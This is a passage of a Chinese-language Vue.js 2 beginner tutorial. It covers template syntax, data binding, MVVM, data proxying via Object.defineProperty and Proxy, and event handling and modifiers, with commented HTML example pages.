##  vue基础

vue英文官网: `https://vuejs.org/`

vue中文官网: `https://cn.vuejs.org/`

##  1. vue简介

### 1.1 vue简介

**vue简介**：vue是一套用于构建用户界面的渐进式JavaScript框架。渐进式说明Vue可以自底向上逐层的应用，对于简单应用只需一个轻量小巧的核心库，对于复杂应用可以引入各式各样的Vue插件。Vue.js 是一个构建用户界面的渐进式框架，特别关注视图层。易于上手，同时也能帮助开发者构建强大的单页面应用（SPA）

**渐进式特点**：Vue被描述为渐进式JavaScript框架，这里的“渐进式”意味着可以根据需要逐渐采用Vue。对于简单的项目，可能只需要用到Vue的一小部分功能，比如数据绑定和组件系统。随着项目的复杂度增加，可能会开始使用Vue的更高级功能，如Vuex（状态管理）和Vue Router（路由管理）。 这种渐进式的特点使得Vue既可以作为库的形式被引入到现有项目中，仅仅用来改善某个特定的部分（比如一个复杂的表单或交互列表），也可以作为完整的框架来构建单页应用程序（SPA）。这种灵活性是Vue的一大优势，允许开发者根据项目的需求和个人的偏好来决定如何使用Vue

**vue发展历史**：

```
2013年: 受到Angular框架的启发，尤雨溪开发出了一款轻量框架—Seed。同年12月，Seed更名为Vue，版本号0.6.0

2014年: Vue正式对外发布，版本号0.8.0。大神Taylor otwell在Twitter上发表动态，说自己正在学习Vue.js，对vue起到推广作用

2015年：10月27日，正式发布Vue1.0.0 Evangelion(新世纪福音战士)

2016年：10月1日，正式发布Vue 2.0.0 Ghost in the Shell(攻壳机动队)

2020年：9月18日，正式发布Vue 3.0.0 One Piece（海贼王)
```

###  1.2 Vue的特点

1.vue采用组件化模式，提高代码复用率、且让代码更好维护

2.声明式编码，让编码人员无需直接操作DOM，提高开发效率。Vue 的一个核心特性就是其声明式编码的方式。这种方式让你能更直观、更简洁地描述数据和界面之间的映射关系，而不需要编写具体如何操作 DOM 的命令式代码 。在 Vue 中，声明式编码主要是通过模板（template）来实现的。模板是一种特殊的 HTML，允许你嵌入 Vue 语法以声明式地将数据渲染进 DOM。Vue 会负责所有繁琐的 DOM 更新和事件处理工作，你只需要关注数据本身及如何显示这些数据。声明式编码示例：

![image-20240330123926069](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122354929.png)

3.使用虚拟DOM+优秀的Diff 算法，尽量复用DOM节点。1.**虚拟 DOM：** Vue中的虚拟DOM是一个轻量级的JavaScript对象，它是真实DOM的一个抽象表示。在Vue中，当组件的状态发生变化时，Vue会首先将变化应用于虚拟DOM，而不是直接操作真实的DOM。这样做的好处是虚拟DOM操作比真实DOM操作更快，因为它减少了直接与DOM交互的次数，DOM操作是Web开发中成本最高的操作之一。 2. **Diff 算法：** 当虚拟DOM发生变化后，Vue使用一种叫做“Diff算法”的方法来比较新旧虚拟DOM之间的差异。这个算法可以高效地识别出变化的部分，只将这些变化应用到真实的DOM上。这意味着，如果你的页面有1000个节点，而只有一个节点发生了变化，Vue的Diff算法可以识别出这个变化，然后只更新这一个节点，而不是重新渲染整个页面。这大大提高了应用的性能和响应速度。 3. **尽量复用DOM节点：** 在Vue的Diff算法中，会尽可能地复用已存在的DOM节点。这意味着如果在新旧虚拟DOM之间可以找到相似的节点结构，Vue会尽量保持这些DOM节点不变，而只是修改它们的属性或子节点。这进一步减少了DOM操作的数量，因为创建新的DOM节点比修改已有节点的成本要高得多。 总的来说，Vue通过虚拟DOM和高效的Diff算法，实现了对DOM的高效操作，尽量复用DOM节点，从而提高了应用的性能和用户体验

![image-20240330131957042](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122353607.png)

![image-20240330132016937](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122353262.png)

4.遵循MVVM模式。编码简洁，体积小，运行效率高，适合移动/PC端开发。vue只关注UI，也可以引入其它第三方库开发项目

### 1.3 vue的周边库

Vue 社区非常活跃，开发了许多周边库和插件来扩展 Vue 的功能。以下是一些常见的 Vue 周边库： 

- **Vuex**: Vuex 是 Vue.js 的状态管理模式和库，它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 特别适用于大型单页应用（SPA），为复杂的应用提供了一种组织和管理状态的机制
- **Vue Router**: Vue Router 是 Vue.js 官方的路由管理器。它和 Vue.js 核心深度集成，让构建单页应用变得易如反掌。Vue Router 允许你为组件指定路由，并在用户导航应用时动态加载这些组件
- **Vuetify**: Vuetify 是 Vue.js 的材料设计组件框架，提供了一套丰富的 UI 组件，帮助你快速构建美观且具有响应性的前端界面。Vuetify 适用于那些希望使用 Google 的 Material Design 指南来设计他们应用 UI 的开发者
-  **Quasar Framework**: Quasar 是一个基于 Vue.js 的框架，允许你一次编写代码，然后将其部署为网站、PWA（Progressive Web Apps）、SSR（服务器端渲染应用）、移动应用（使用 Cordova 或 Capacitor 转为原生应用）和 Electron 应用（桌面应用）
- **Nuxt.js**: Nuxt.js 是一个基于 Vue.js 的更高阶的框架，用于创建服务器端渲染（SSR）的 Vue 应用。它为客户端和服务器端的应用架构提供了一个灵活且强大的框架，特别是对于 SEO 和优化首屏加载时间非常有帮助
- **VuePress**: VuePress 是由 Vue.js 团队开发的一个静态站点生成器，它利用 Vue 组件开发灵活性的同时，为每个页面预渲染生成静态的 HTML。VuePress 非常适合编写技术文档和博客
-  **Element UI**: Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库，目的是加速 UI 的开发。 这些库和框架扩展了 Vue 的功能，使得开发各种类型的前端应用变得更加高效和便捷。根据你的项目需求和偏好选择合适的库可以大大提高开发效率

###  1.4 vue基本使用

1.浏览器安装vue开发插件,下载地址：`https://github.com/vuejs/devtools#vue-devtools`

2.下载`vue.js`、`vue.min.js` 、图标`favicon.ico`并导入到项目中

3.编码解析见注释）

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>初识Vue</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			初识Vue：
				1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象（如本例中的el）；
				2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
				3.root容器里的代码被称为【Vue模板】；
				4.Vue实例和容器是一一对应的；
				5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
				6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
				注意区分：js表达式 和 js代码(语句)
							1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
										(1). a
										(2). a+b
										(3). demo(1)
										(4). x === y ? 'a' : 'b'
										(5). name.toUpperCase()

							2.js代码(语句)
										(1). if(){}
										(2). for(){}
				7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；
		-->

		<!-- 准备好一个容器 -->
		<div id="demo">
			<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
		</div>

		<script type="text/javascript" >
			Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

			//创建Vue实例
			new Vue({
				el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
				data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
					name:'atguigu',
					address:'北京'
				}
			})
		</script>
	</body>
</html>
```

##  2. 模板语法

html 中包含了一些JS语法代码，语法分为两种，分别为：插值语法（双大括号表达式)、指令(以v-开头)

```
插值语法：
         功能:用于解析标签体内容
         语法: {fxxx}} , xxxx会作为js表达式解析
指令语法：
          功能:解析标签属性、解析标签体内容、绑定事件
          举例: v-bind:href = 'xxxx', xxxx会作为js表达式被解析
          说明: Vue中有有很多的指令，此处只是用v-bind举个例子
```

代码示例：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				Vue模板语法有2大类：
					1.插值语法：
							功能：用于解析标签体内容。
							写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
					2.指令语法：
							功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
							举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
									 且可以直接读取到data中的所有属性。
							备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr/>
			<h1>指令语法</h1>
			<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
			<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'jack',
				school:{
					name:'尚硅谷',
					url:'http://www.atguigu.com',
				}
			}
		})
	</script>
</html>
```

**vue模板语法**：Vue 的模板语法是一种简洁的标记语言，模板语法使开发者能够使用普通的 HTML 结构来声明式地绑定渲染数据到 DOM（文档对象模型）。这种语法主要依赖于两大部分：插值和指令

**插值**：

- **文本插值：** 最常见的形式就是使用双大括号 `{{ }}` 来包含绑定的数据。Vue 会自动将其替换为对应数据对象上的属性值

```html
<!-- 如果message的值为 "Hello, Vue!"，那么渲染结果将是 <span>Hello, Vue!</span> -->
<span>{{ message }}</span>
```

- **原始 HTML：** 使用 `v-html` 指令绑定 HTML 内容，而不是文本，可以设置元素的 innerHTML

```html
<!-- 这将跳过普通文本的插值行为，直接按照 rawHtml 的 HTML 结构来渲染元素 -->
<div v-html="rawHtml"></div>
```

**指令**：

- 指令说明：指令是带有 `v-` 前缀的特殊属性。指令的作用是在表达式的值改变时，将某些行为应用到 DOM 上

- **参数：** 指令可以带有参数，用于指示要应用到哪个属性上，如 `v-bind:href` 用于绑定链接地址

```html
<!-- 当 url 的值改变时，a 元素的 href 属性将自动更新 -->
<a v-bind:href="url">Visit</a>
```

- **修饰符：** 修饰符是以点开头的特殊后缀，用于表示指令应该以特定方式绑定。例如，`.prevent` 用于 `v-on` 指令来自动调用 `event.preventDefault()`

```html
<form v-on:submit.prevent="onSubmit">...</form>
```

**缩写：** Vue 对常用的指令提供了缩写形式

```html
<!-- v-bind: 缩写 -->
<a :href="url">Visit</a>
<!-- v-on: 缩写为 @ -->
<button @click="doSomething">Click me</button>
```

## 3. 数据绑定

单向数据绑定

- 语法: v-bind:href ="xxx"或简写为:href
- 特点:数据只能从data流向页面

双向数据绑定

- 语法: v-mode:value="xxx”或简写为v-model="xxx"
- 特点:数据不仅能从data流向页面，还能从页面流向data

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			Vue中有2种数据绑定的方式：
					1.单向绑定(v-bind)：数据只能从data流向页面。
					2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
						备注：
								1.双向绑定一般都应用在表单类元素上（如：input、select等）
								2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 普通写法 -->
			<!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
			双向数据绑定：<input type="text" v-model:value="name"><br/> -->

			<!-- 简写 -->
			单向数据绑定：<input type="text" :value="name"><br/>
			双向数据绑定：<input type="text" v-model="name"><br/>

			<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
			<!-- <h2 v-model:x="name">你好啊</h2> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

**数据绑定**：在Vue中，数据绑定是一项核心功能，它允许开发者将数据和DOM（文档对象模型）元素绑定起来，当数据变化时，视图也会自动更新。数据绑定极大地简化了开发者的工作。开发者不需要手动操作DOM来更新页面内容。Vue提供了多种数据绑定的方式，以下是几种常用的数据绑定方法：  

1.**插值表达式**：使用双大括号 `{{ }}` 来绑定数据到文本节点。这种方式通常用于将数据显示在HTML元素内部

 ```html
 <p>{{ message }}</p>
 ```

 2.**v-bind 指令**：用于绑定属性值。例如，可以将数据绑定到元素的 `title` 属性、`class` 属性或 `style` 属性上。`v-bind` 可以缩写为：

```html
<!-- 完整写法 -->
<a v-bind:href="url">点击这里</a>
<!-- 缩写 -->
<a :href="url">点击这里</a>
```

3.**v-model 指令**：用于在表单输入和应用状态之间创建双向数据绑定。当表单输入变化时，绑定的数据也会更新

```html
<input v-model="message">
```

4.**v-on 指令**：用于监听DOM事件，并在触发时执行一些JavaScript代码。虽然它不是直接用于数据绑定，但经常与数据绑定一起使用来响应用户输入

```html
<button v-on:click="counter += 1">点击我</button>
<!-- 缩写 -->
<button @click="counter += 1">点击我</button>
```

5.**v-for 指令**：用于基于一个数组渲染一个元素列表。每个元素都可以绑定数组中的一个项的数据

```html
<ul>
  <li v-for="item in items">{{ item.text }}</li>
</ul>
```

6.**v-if、v-else-if、v-else 指令**：用于根据表达式的真值来条件性地渲染元素。可以实现在不同条件下显示不同的内容

```html
<p v-if="seen">现在你看到我了</p>
```

**数据绑定示例一**：数据绑定、事件处理、条件渲染和列表渲染的基本用法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue Data Binding Example</title>
    <!-- <script src="https://cdn.jsdelivr.net/npm/vue@2"></script> 引入Vue.js -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

<div id="app">
    <!-- 插值表达式 -->
    <p>{{ message }}</p>
    
    <!-- v-bind 指令 -->
    <a :href="url">点击这里访问Google</a>
    
    <!-- v-model 指令 -->
    <input v-model="message">
    
    <!-- v-on 指令 -->
    <button @click="counter += 1">点击我</button>
    <p>点击次数: {{ counter }}</p>
    
    <!-- v-for 指令 -->
    <ul>
        <li v-for="item in items">{{ item.text }}</li>
    </ul>
    
    <!-- v-if、v-else 指令 -->
    <p v-if="seen">现在你看到我了</p>
    <p v-else>现在你看不到我</p>
</div>

<script>
    var app = new Vue({
        el: '#app',
        data: {
            message: '你好，Vue!',
            url: 'https://www.google.com',
            counter: 0,
            items: [
                { text: '学习JavaScript' },
                { text: '学习Vue' },
                { text: '构建令人惊叹的项目' }
            ],
            seen: true
        }
    });
</script>

</body>
</html>
```

**代码解读**：

- `{{ message }}` 使用了插值表达式来显示变量 `message` 的值
- `:href="url"` 使用了 `v-bind` 指令来绑定 `href` 属性的值，允许动态更新链接地址
- `<input v-model="message">` 使用了 `v-model` 来实现数据的双向绑定，输入框中的内容和变量 `message` 会相互更新
- `<button @click="counter += 1">` 使用了 `v-on` 指令（缩写为 `@click`）来监听点击事件，并更新 `counter` 变量
- `<li v-for="item in items">` 使用了 `v-for` 指令来遍历 `items` 数组，并为每个项目创建一个列表项
- `<p v-if="seen">` 和 `<p v-else>` 使用了 `v-if` 和 `v-else` 指令来根据 `seen` 变量的值条件性地渲染段落

## 4. el与data的两种写法

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			data与el的2种写法
					1.el有2种写法
									(1).new Vue时候配置el属性。
									(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
					2.data有2种写法
									(1).对象式
									(2).函数式
									如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
					3.一个重要的原则：
									由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```

## 5. MVVM模式

MVVM模式相关解释：`https://zh.wikipedia.org/wiki/MVVM`（维基百科）

```
1.M:模型(Model):          对应data 中的数据
2.V:视图(View):           模板
3.VM:视图模型(ViewModel):  Vue实例对象
```

![image-20240331011631980](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122355716.png)

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>理解MVVM</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			MVVM模型
						1. M：模型(Model) ：data中的数据
						2. V：视图(View) ：模板代码
						3. VM：视图模型(ViewModel)：Vue实例
			观察发现：
						1.data中所有的属性，最后都出现在了vm身上
						2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校名称：{{name}}</h1>
			<h1>学校地址：{{address}}</h1>
			<!-- <h1>测试一下1：{{1+1}}</h1>
			<h1>测试一下2：{{$options}}</h1>
			<h1>测试一下3：{{$emit}}</h1>
			<h1>测试一下4：{{_c}}</h1> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
			}
		})
		console.log(vm)
	</script>
</html>
```

**MVVM 模式**：MVVM（Model-View-ViewModel）是一种软件架构设计模式，特别适合用于构建用户界面（UI）。它在前端开发中，特别是在使用 WPF（Windows Presentation Foundation）、Silverlight、Angular和Vue.js等技术栈时，非常受欢迎。MVVM 的设计旨在将展示逻辑或用户界面（UI）的开发从后端业务逻辑中分离出来，以提高代码的可测试性、可维护性和复用性。MVVM 模式使得开发复杂的用户界面变得更加简单和可管理，是现代应用程序及Web开发中广泛使用的一种架构模式

**MVVM 模式主要包含三个核心组成部分**：

- **1. Model（模型）**：模型代表特定的数据或业务逻辑，通常存取于数据库中。它直接管理应用的数据、逻辑和规则，是应用程序的领域模型（对问题域的抽象）

- **2. View（视图）**：视图是用户界面的组成部分，展示给用户的数据表示。在 MVVM 架构中，视图负责定义结构、布局和外观，但不处理任何实际逻辑。它通过绑定到 ViewModel 上的数据来显示内容和接收用户输入

- **3. ViewModel（视图模型）**：ViewModel 作为 Model 和 View 之间的桥梁，是一个抽象的视图表示，它持有模型，并转换模型中的数据，使数据更适于显示。ViewModel 处理大部分视图的表示逻辑，例如点击按钮时的操作（不是按钮的实现，而是按钮被点击时应当发生的业务逻辑）。它向视图暴露只读的数据属性和命令，视图通过数据绑定来显示这些数据，而ViewModel则负责处理视图上的用户交互逻辑

**MVVM 数据绑定（Data Binding）**：MVVM 的一个关键特性是支持双向数据绑定，这意味着如果数据源（Model）发生更改，这些更改可以自动传播到ViewModel和视图，而视图中的更改也能自动反映在ViewModel。这减少了大量的样板代码，因为开发者不需要手动同步视图和数据模型

**MVVM 的优点**：

- **低耦合**：视图（UI）和业务逻辑分离，易于维护和扩展
- **提高可测试性**：由于ViewModel不依赖于视图，因此可以在不涉及用户界面的情况下进行测试
- **提高可复用性**：可以在不同的视图中复用ViewModel，或者在不同的项目中复用模型和ViewModel
- **强化数据绑定**：双向数据绑定简化了UI和业务逻辑的同步过程

## 6.数据代理

### 6.1  回顾Object.defineProperty

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})

			// console.log(Object.keys(person))

			console.log(person)
		</script>
	</body>
</html>
```

**`Object.defineProperty` 方法**：`Object.defineProperty` 方法允许精确地添加一个新属性或修改一个对象（object）的现有属性，并对属性的特性进行精确控制。这些特性包括属性的值（value）、是否可枚举（enumerable）、是否可配置（configurable）以及是否可写（writable）。注意：使用 `Object.defineProperty` 添加的属性，默认情况下其 `configurable`、`enumerable` 和 `writable` 都是 `false`。这是与直接在对象上添加属性时不同的，那种情况下这些特性默认都是 `true`。因此，使用 `Object.defineProperty` 时，需要明确地指定想要的行为

`Object.defineProperty` 的基本语法如下：

```javascript
//  obj：          要在其上定义属性的对象
//  prop：         要定义或修改的属性的名称
//  descriptor：   属性描述符，这是一个对象，用来描述新属性或修改的属性的具体细节
Object.defineProperty(obj, prop, descriptor)

// descriptor属性描述符对象可以有以下键：
        // value：           属性对应的值。可以是任何有效的 JavaScript 值（数值、对象、函数等）
        // writable：        当且仅当属性的值可以被改变时为 true
        // enumerable：      如果该属性在循环中被枚举则为 true
        // configurable：    如果该属性的描述符可以被改变，或该属性可以从对应的对象上被删除，则为 true
        // get：             一个给属性提供 getter 的方法。如果有 get 键，它必须是一个函数，这个函数在访问属性时会被调用
        // set：             一个给属性提供 setter 的方法。如果有 set 键，它必须是一个函数，这个函数在属性值被修改时会被调用
```

`Object.defineProperty` 的使用示例：

```javascript
const person = {};

Object.defineProperty(person, 'name', {
  value: 'John',
  writable: false,
  enumerable: true,
  configurable: false
});

console.log(person.name); // "John"

// 由于 writable: false，以下尝试修改属性值将不会生效
person.name = 'Jane';
console.log(person.name); // "John"
// 定义一个名为 name 的属性，其值为 "John"。因为设置了 writable 为 false，这意味着该属性的值不能被修改
```

### 6.2  数据代理简介

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
		<script type="text/javascript" >
			let obj = {x:100}
			let obj2 = {y:200}

			Object.defineProperty(obj2,'x',{
				get(){
					return obj.x
				},
				set(value){
					obj.x = value
				}
			})
		</script>
	</body>
</html>
```

在JavaScript中可以通过`Object.defineProperty`和数据代理（通常通过Proxy实现）两种方法来精细的控制对象属性的行为。`Object.defineProperty` 方法允许你准确地添加新属性或修改对象中现有属性，并且可以精确控制这些属性的行为。使用这个方法，你可以定义属性的各种特性，如可枚举性（enumerable）、可配置性（configurable）、可写性（writable）、以及一个属性的值（value）、获取函数（get）和设置函数（set）。通过使用`get`和`set`可以创建所谓的访问器属性（accessor properties），这使得在读写属性时可以执行更多自定义的逻辑

```javascript
const object = {};
Object.defineProperty(object, 'property', {
  value: 123,
  writable: false, // 不可写
  enumerable: true, // 可枚举
  configurable: false // 不可配置
});

console.log(object.property); // 输出：123
// 由于writable为false，下面这行代码不会改变property的值
object.property = 456;
console.log(object.property); // 依旧输出：123
```

数据代理`Proxy` 对象用于定义基本操作的自定义行为（如属性查找、赋值、枚举、函数调用等）。简而言之，代理可以控制对对象的访问

```javascript
// 创建一个Proxy对象，它修改了对target对象message2属性的访问
// 这表明尽管原始对象没有被改变，但通过代理可以控制对它的访问和操作
const target = {
  message1: "hello",
  message2: "everyone"
};

const handler = {
  get: function(target, prop, receiver) {
    if (prop === "message2") {
      return "world";
    }
    return Reflect.get(...arguments);
  }
};

const proxy = new Proxy(target, handler);

console.log(proxy.message1); // 输出：hello
console.log(proxy.message2); // 输出：world
```

总结：使用`Object.defineProperty`可以在对象上定义新的属性或修改现有属性，并精确控制这些属性的行为。`Proxy`对象允许你定义对另一个对象（目标对象）的操作的自定义行为。这两种方法各有优势，选择使用哪一种取决于想要解决的问题和需要的控制级别

###  6.3 vue中的数据代理

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue中的数据代理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中的数据代理：
							通过vm对象来代理data对象中属性的操作（读/写）
				2.Vue中数据代理的好处：
							更加方便的操作data中的数据
				3.基本原理：
							通过Object.defineProperty()把data对象中所有属性添加到vm上。
							为每一个添加到vm上的属性，都指定一个getter/setter。
							在getter/setter内部去操作（读/写）data中对应的属性。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>

		<!-- vm._data就是data,所以也可以这样写 -->
		<!-- <div id="root">
			<h2>学校名称：{{_data.name}}</h2>
			<h2>学校地址：{{_data.address}}</h2>
		</div> -->
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'宏福科技园'
			}
		})
	</script>
</html>
```

Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）。vm._data就是data

![image-20240331140224977](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122355439.png)

vue数据代理图示：

![image-20240331141932224](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122356344.png)

## 7.  事件处理

###  7.1 事件的基本使用

绑定监听事件的方法：

```
1.v-on:xxx="fun"
2.@xxx="fun"
3.xxx="fun(参数)"
4.默认事件形参: event
5.隐含属性对象: $event
```

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				事件的基本使用：
							1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
							2.事件的回调需要配置在methods对象中，最终会在vm上；
							3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
							4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
							5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

###  7.2 事件修饰符

```
事件修饰符：
            1.prevent:    阻止事件的默认行为event.preventDefault()
            2.stop:       停止事件冒泡event.stopPropagation()
按键修饰符：
            1.keycode:    操作的是某个keycode值的键
            2.keyName:    操作的某个按键名的键(少部分)
```

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<!-- 使用passive以后，滚动条会立即滚动，否则会默认行为（滚动）会等到事件回调结束后才执行 -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
